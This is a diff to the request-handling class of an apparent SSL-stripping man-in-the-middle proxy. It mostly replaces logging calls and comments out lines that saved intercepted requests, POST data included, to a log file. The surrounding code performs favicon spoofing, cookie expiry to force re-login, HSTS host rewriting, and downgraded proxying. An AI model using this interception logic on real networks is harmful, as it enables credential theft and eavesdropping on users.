@@ -44,7 +44,7 @@ class ClientRequest(Request):
     respond with either favicon spoofing, session denial, or proxy through HTTP
     or SSL to the server.
     '''    
-    
+    logging = None
     def __init__(self, channel, queued, reactor=reactor):
         Request.__init__(self, channel, queued)
         self.reactor       = reactor
@@ -75,7 +75,7 @@ class ClientRequest(Request):
         	
         if 'host' in headers:
         	host = self.urlMonitor.URLgetRealHost("%s"%headers['host'])
-        	logging.debug("Modifing HOST header: %s -> %s"%(headers['host'],host))
+        	self.logging.emit("Modifing HOST header: %s -> %s"%(headers['host'],host))
         	headers['host'] = host
         	#headers['securelink'] = '1'
         	self.setHeader('Host',host)
@@ -98,7 +98,7 @@ class ClientRequest(Request):
 
         if os.path.exists(scriptPath): return scriptPath
 
-        logging.warning("Error: Could not find lock.ico")
+        self.logging.emit("Error: Could not find lock.ico")
         return "lock.ico"        
 
     def save_req(self,lfile,str):
@@ -109,8 +109,8 @@ class ClientRequest(Request):
     def handleHostResolvedSuccess(self, address):
         headers       = self.cleanHeaders()
 #         for header in headers:
-#         	logging.debug("HEADER %s = %s",header,headers[header])
-        logging.debug("Resolved host successfully: %s -> %s" % (self.getHeader('host').lower(), address))
+#         	self.logging.emit("HEADER %s = %s",header,headers[header])
+        self.logging.emit("Resolved host successfully: %s -> %s" % (self.getHeader('host').lower(), address))
         lhost		  = self.getHeader("host").lower()
         host          = self.urlMonitor.URLgetRealHost("%s"%lhost)
         client        = self.getClientIP()
@@ -133,39 +133,39 @@ class ClientRequest(Request):
 
         self.dnsCache.cacheResolution(host, address)
         if (not self.cookieCleaner.isClean(self.method, client, host, headers)):
-            logging.debug("Sending expired cookies...")
+            self.logging.emit("Sending expired cookies...")
             self.sendExpiredCookies(host, path, self.cookieCleaner.getExpireHeaders(self.method, client,
                                                                                     host, headers, path))
         elif (self.urlMonitor.isSecureFavicon(client, path)):
-            logging.debug("Sending spoofed favicon response...")
+            self.logging.emit("Sending spoofed favicon response...")
             self.sendSpoofedFaviconResponse()
         elif (self.urlMonitor.isSecureLink(client, url) or ('securelink' in headers)):
         	if 'securelink' in headers:
         		del headers['securelink']
-        	logging.debug("LEO Sending request via SSL...(%s %s)"%(client,url))
+        	self.logging.emit("Sending request via SSL...(%s %s)"%(client,url))
         	self.proxyViaSSL(address, self.method, path, postData, headers,
                              self.urlMonitor.getSecurePort(client, url))
         else:
-            logging.debug("LEO Sending request via HTTP...")
+            self.logging.emit("Sending request via HTTP...")
             self.proxyViaHTTP(address, self.method, path, postData, headers)
 
     def handleHostResolvedError(self, error):
-        logging.warning("Host resolution error: " + str(error))
+        self.logging.emit("Host resolution error: " + str(error))
         self.finish()
 
     def resolveHost(self, host):
         address = self.dnsCache.getCachedAddress(host)
 
         if address != None:
-            logging.debug("Host cached.")
+            self.logging.emit("Host cached.")
             return defer.succeed(address)
         else:
-            logging.debug("Host not cached.")
+            self.logging.emit("Host not cached.")
             return reactor.resolve(host)
 
     def process(self):
     	host     = self.urlMonitor.URLgetRealHost("%s"%self.getHeader('host'))               
-        logging.debug("Resolving host: %s" % host)
+        self.logging.emit("Resolving host: %s" % host)
         deferred = self.resolveHost(host)
 
         deferred.addCallback(self.handleHostResolvedSuccess)
@@ -173,12 +173,12 @@ class ClientRequest(Request):
         
     def proxyViaHTTP(self, host, method, path, postData, headers):
         connectionFactory          = ServerConnectionFactory(method, path, postData, headers, self)
-        self.save_req("debug_ssl.log",method+' http://'+host+path+'\n'+str(headers)+'\n'+postData+'\n')
+        #self.save_req("debug_ssl.log",method+' http://'+host+path+'\n'+str(headers)+'\n'+postData+'\n')
         connectionFactory.protocol = ServerConnection
         self.reactor.connectTCP(host, 80, connectionFactory)
 
     def proxyViaSSL(self, host, method, path, postData, headers, port):
-		self.save_req("debug_ssl.log",method+' https://'+host+path+'\n'+str(headers)+'\n'+postData+'\n')
+		#self.save_req("debug_ssl.log",method+' https://'+host+path+'\n'+str(headers)+'\n'+postData+'\n')
 		clientContextFactory       = ssl.ClientContextFactory()
 		connectionFactory          = ServerConnectionFactory(method, path, postData, headers, self)
 		connectionFactory.protocol = SSLServerConnection
